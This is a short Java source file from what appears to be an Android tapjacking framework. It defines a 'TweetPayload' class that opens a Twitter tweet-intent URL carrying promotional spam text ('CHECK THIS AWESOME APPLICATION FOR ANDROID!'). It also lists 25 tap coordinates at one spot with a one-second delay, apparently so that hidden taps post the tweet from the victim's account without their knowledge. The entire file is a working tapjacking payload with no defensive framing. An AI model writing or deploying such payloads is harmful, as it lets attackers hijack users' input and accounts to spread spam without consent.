package com.tapjacking.payloads;

import com.tapjacking.framework.FrameworkPayload;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;

public class TweetPayload extends FrameworkPayload {
	public TweetPayload() {
		for(int i=0; i<=24; i++)
			positions.add(new Point(350, 610));
	}

	public Intent getIntent() {
		String tweetURL = "https://twitter.com/intent/tweet?text=YEP, CHECK THIS AWESOME APPLICATION FOR ANDROID!";
		Uri uri = Uri.parse(tweetURL);

		Intent intent = new Intent(Intent.ACTION_VIEW, uri);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		return intent;
	}

	public int getSleep() {
		return 1000;
	}
}